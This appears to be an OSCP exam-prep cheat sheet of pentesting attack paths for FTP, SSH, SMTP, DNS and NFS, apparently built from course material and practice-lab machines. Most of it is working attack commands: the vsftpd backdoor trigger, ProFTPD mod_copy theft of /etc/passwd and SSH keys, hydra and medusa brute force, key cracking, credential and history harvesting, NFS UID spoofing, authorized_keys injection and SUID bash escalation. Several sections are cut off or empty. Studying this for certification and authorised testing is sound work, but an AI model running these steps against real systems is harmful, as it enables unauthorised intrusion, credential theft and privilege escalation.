OSCP Service Methodology Bank#

Workflow-first reference for all common pentesting services. Each entry follows the same lifecycle: trigger recognition → enumeration → exploitation chains → post-exploitation pivot. Built from PEN-200 course material and mapped to Proving Grounds Practice machines.

INFOHow to Use

Run a full port scan first. Match open ports against the Master Trigger Index below to identify which service methodology to activate. Work phases in order — enumeration informs exploitation; do not skip to Phase 2 without completing Phase 1.

FTP — Port 21 / TCP#

TIPTrigger Conditions
SignalDetail
Ports21/tcp
Common Bannersvsftpd 2.3.4, ProFTPD 1.3.5, FileZilla Server, Pure-FTPd
Quick Win Indicatorsftp-anon: Anonymous FTP login allowed in nmap output; version matches known CVE
Version Flagsvsftpd 2.3.4 → backdoor; ProFTPD 1.3.5 → mod_copy RCE
INFOTools Required

nmap ftp wget hydra netcat searchsploit metasploit

Phase 1 — Enumeration#

EXAMPLE1.1 Initial Recon
BASH
# Full script scan
nmap -sC -sV -p 21 <TARGET>

# Targeted FTP scripts
nmap --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor,ftp-proftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 <TARGET>

# Banner grab
nc -nv <TARGET> 21
EXAMPLE1.2 Anonymous Login Check
BASH
# Manual — try anonymous / anonymous or anonymous / <any email>
ftp <TARGET>
Name: anonymous
Password: anonymous

# Check for files and permissions
ls -la
cd <dir>
get <file>

# Recursive download (anonymous)
wget -m ftp://anonymous:anonymous@<TARGET>
wget -m --no-passive ftp://anonymous:anonymous@<TARGET>
EXAMPLE1.3 Authenticated Enumeration
BASH
# Log in with known credentials
ftp <TARGET>

# Inside FTP — key commands
ls -la          # List all including hidden
pwd             # Current directory
cd /            # Navigate to root if allowed
binary          # Set binary transfer mode before downloading
get <file>      # Download single file
mget *          # Download all files
put <file>      # Upload (check if writable)

Phase 2 — Exploitation#

EXAMPLE2.1 Attack Path: Anonymous Access → Credential Harvest

Condition: Anonymous login allowed; files present in share.

BASH
# Download everything
wget -m ftp://anonymous:anonymous@<TARGET>

# Look for: config files, .txt notes, id_rsa, .htpasswd, backup files, web source
find /tmp/ftp-dump -type f | xargs grep -li "pass\|user\|cred\|key\|secret"
EXAMPLE2.2 Attack Path: vsftpd 2.3.4 Backdoor (CVE-2011-2523)

Condition: Banner shows vsftpd 2.3.4.

BASH
# Manual trigger — send smiley face in username
nc -nv <TARGET> 21

# If vulnerable, port 6200 opens — connect in separate terminal
nc -nv <TARGET> 6200

# Metasploit

EXAMPLE2.3 Attack Path: ProFTPD 1.3.5 mod_copy (CVE-2015-3306)

Condition: Banner shows ProFTPD 1.3.5. No authentication required.

BASH
# Copy sensitive file to web root
nc -nv <TARGET> 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt

# Copy SSH key
SITE CPFR /home/<USER>/.ssh/id_rsa
SITE CPTO /var/www/html/id_rsa

# Retrieve via HTTP
curl http://<TARGET>/passwd.txt
curl http://<TARGET>/id_rsa

BASH
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \

      ftp://<TARGET> -t 4

  • Scripts and automation files — may contain creds or reveal internal paths

SSH — Port 22 / TCP#

TIPTrigger Conditions
SignalDetail
Ports22/tcp
Common BannersOpenSSH 7.x, OpenSSH 8.x, Dropbear
Quick Win IndicatorsPrivate key found on another service; username enumeration possible on older OpenSSH
Version FlagsOpenSSH < 7.7 → username enumeration (CVE-2018-15473)
INFOTools Required

nmap ssh hydra medusa ssh-keyscan chmod

Phase 1 — Enumeration#

EXAMPLE1.1 Initial Recon
BASH
nmap -sC -sV -p 22 <TARGET>

# Check supported authentication methods
ssh -v <TARGET> 2>&1 | grep "Authentications that can continue"
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 <TARGET>

# Key exchange algorithms (useful for older systems)
nmap --script ssh2-enum-algos -p 22 <TARGET>
EXAMPLE1.2 Username Enumeration (OpenSSH < 7.7)
BASH
# CVE-2018-15473
python3 ssh_user_enum.py --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
        --ip <TARGET> --port 22

# Validate a single user
ssh -o "StrictHostKeyChecking=no" <USERNAME>@<TARGET>
# Timing difference in response indicates valid user

Phase 2 — Exploitation#

EXAMPLE2.1 Attack Path: Private Key Found Elsewhere

Condition: Found id_rsa via FTP, HTTP, SMB, or LFI.

BASH
# Fix permissions — required or SSH rejects the key
chmod 600 id_rsa

# Connect
ssh -i id_rsa <USER>@<TARGET>

# If key is passphrase-protected
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Crack with hashcat
hashcat -a 0 -m 22931 id_rsa.hash /usr/share/wordlists/rockyou.txt
EXAMPLE2.2 Attack Path: Brute Force
BASH
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET> -t 4
hydra -L users.txt -P pass.txt ssh://<TARGET> -t 4

# Medusa
medusa -h <TARGET> -u <USER> -P /usr/share/wordlists/rockyou.txt -M ssh
EXAMPLE2.3 Attack Path: Default / Weak Credentials
BASH
# Common pairs to try manually
ssh root@<TARGET>          # Try no password
ssh admin@<TARGET>
ssh <HOSTNAME>@<TARGET>    # Machine name as username

Phase 3 — Post-Exploitation & Pivot#

INFOWhat to Harvest
BASH
# SSH keys for lateral movement
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
cat ~/.ssh/known_hosts       # Reveals other hosts this user accesses

# History files
cat ~/.bash_history
cat ~/.zsh_history

# Look for credentials in config files
find / -name "*.conf" 2>/dev/null | xargs grep -li "password\|passwd" 2>/dev/null
EXAMPLESSH Tunneling for Pivoting
BASH
# Local port forward — access internal service on attacker machine
ssh -L <LOCAL_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT> <USER>@<TARGET>
# Example: access internal web app
ssh -L 8080:192.168.1.10:80 user@<TARGET>
# Then browse to http://localhost:8080

# Dynamic SOCKS proxy
ssh -D 1080 <USER>@<TARGET>
# Configure proxychains to use 127.0.0.1:1080
proxychains nmap -sT -p 80,443,445 192.168.1.0/24

# Remote port forward (reverse tunnel from target to attacker)
ssh -R <ATTACKER_PORT>:localhost:<TARGET_PORT> <USER>@<ATTACKER>

TIPTrigger Conditions

Version FlagsOpenSMTPD 6.6.x → CVE-2020-7247 (unauthenticated RCE)

Phase 1 — Enumeration#

EXAMPLE1.1 Initial Recon
BASH
nmap -sC -sV -p 25,110,143,465,587 <TARGET>

# Banner grab
nc -nv <TARGET> 25
nc -nv <TARGET> 110
EXAMPLE1.2 User Enumeration via SMTP Verbs
BASH
# Manual — VRFY
nc -nv <TARGET> 25
HELO attacker.local
VRFY root
VRFY admin
VRFY <USERNAME>
# 252 or 250 = user exists; 550 = does not exist

# EXPN — expands mailing lists
EXPN admin
EXPN root

# RCPT TO — often works even when VRFY/EXPN are disabled
MAIL FROM:<test@test.com>
RCPT TO:<root@<TARGET>>

# Automated user enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET>
smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET>
smtp-user-enum -M RCPT -D <DOMAIN> -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET>

EXAMPLE2.1 Attack Path: OpenSMTPD CVE-2020-7247 (Unauthenticated RCE)

DNS — Port 53 / TCP + UDP#

TIPTrigger Conditions
SignalDetail
Ports53/tcp, 53/udp
Common BannersBIND, dnsmasq, Microsoft DNS
Quick Win IndicatorsZone transfer allowed; domain name discoverable via PTR; subdomain enum reveals internal apps
When to PrioritizeWhen a hostname or domain is known; always run before attacking web apps
INFOTools Required

nmap dig host dnsrecon dnsenum gobuster fierce

Phase 1 — Enumeration#

EXAMPLE1.1 Initial Recon
BASH
nmap -sC -sV -p 53 <TARGET>
nmap -sU -p 53 <TARGET>

# Identify domain from reverse lookup
dig -x <TARGET_IP> @<TARGET>
host <TARGET_IP> <TARGET>
EXAMPLE1.2 Zone Transfer (Highest Priority)
BASH
# dig AXFR — try the target IP as nameserver
dig axfr <DOMAIN> @<TARGET>
dig axfr @<TARGET> <DOMAIN>

# host zone transfer
host -l <DOMAIN> <TARGET>

# dnsrecon
dnsrecon -d <DOMAIN> -t axfr

# dnsenum
dnsenum --dnsserver <TARGET> --enum <DOMAIN>
EXAMPLE1.3 Subdomain Brute Force
BASH
gobuster dns -d <DOMAIN> \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -r <TARGET>

dnsrecon -d <DOMAIN> -t brt \
    -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

fierce --domain <DOMAIN> --dns-servers <TARGET>

Phase 2 — Exploitation#

EXAMPLE2.1 Attack Path: Zone Transfer → Attack Surface Expansion

Condition: Zone transfer returns internal hostnames.

BASH
# Perform AXFR and parse output
dig axfr <DOMAIN> @<TARGET> | tee zone_transfer.txt

# Add all discovered hostnames to /etc/hosts
echo "<IP> <HOSTNAME>.<DOMAIN>" >> /etc/hosts

# Now enumerate each discovered hostname separately
# Look for: dev., admin., internal., api., vpn., mail. subdomains
EXAMPLE2.2 Attack Path: Subdomain Discovery → Hidden Web App
BASH
# Brute force with wordlist
gobuster dns -d <DOMAIN> \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -r <TARGET>

# Add found subdomains to /etc/hosts and browse to them
echo "<TARGET_IP> dev.<DOMAIN>" >> /etc/hosts
curl -I http://dev.<DOMAIN>

Phase 3 — Post-Exploitation & Pivot#

INFOWhat to Harvest
BASH
# After pivot into internal network — DNS for topology mapping
nmap -sU -p 53 <INTERNAL_SUBNET>/24    # Find internal DNS servers
dig axfr <INTERNAL_DOMAIN> @<INTERNAL_DNS>  # Internal zone transfer

# Enumerate all A records
dig ANY <DOMAIN> @<TARGET>

Phase 1 — Enumeration#

EXAMPLE1.1 Initial Recon
BASH

EXAMPLE1.2 Mount and Inspect
BASH
# Create mount point
mkdir /mnt/nfs

# Mount export
mount -t nfs <TARGET>:/share /mnt/nfs -o nolock
mount -t nfs <TARGET>:/ /mnt/nfs -o nolock

# List with permissions
ls -la /mnt/nfs

Phase 2 — Exploitation#

EXAMPLE2.1 Attack Path: World-Readable Share → File Exfil
BASH
# Mount and read files
mount -t nfs <TARGET>:/<EXPORT> /mnt/nfs -o nolock
cat /mnt/nfs/etc/shadow        # If root filesystem exported
find /mnt/nfs -name "*.txt" -o -name "id_rsa" -o -name "*.conf"
EXAMPLE2.2 Attack Path: UID Spoofing → Restricted File Access

Condition: Export restricts access to a specific UID. ls -lan shows numeric UID on files.

BASH
# Identify target UID
ls -lan /mnt/nfs/home/<USER>

# Create local user with matching UID
useradd -u <TARGET_UID> attacker_local
su attacker_local
cat /mnt/nfs/home/<USER>/.ssh/id_rsa
cat /mnt/nfs/home/<USER>/.bash_history
EXAMPLE2.3 Attack Path: Writable Share + no_root_squash → SSH Key Injection

Condition: Export writable; no_root_squash set; target user has SSH enabled.

BASH
# Copy attacker public key as authorized_keys
mkdir -p /mnt/nfs/home/<USER>/.ssh
cp ~/.ssh/id_rsa.pub /mnt/nfs/home/<USER>/.ssh/authorized_keys
chmod 700 /mnt/nfs/home/<USER>/.ssh
chmod 600 /mnt/nfs/home/<USER>/.ssh/authorized_keys

# If root filesystem exposed with no_root_squash — write SUID bash
cp /bin/bash /mnt/nfs/tmp/bash
chmod +s /mnt/nfs/tmp/bash
# On target
/tmp/bash -p    # Run with SUID
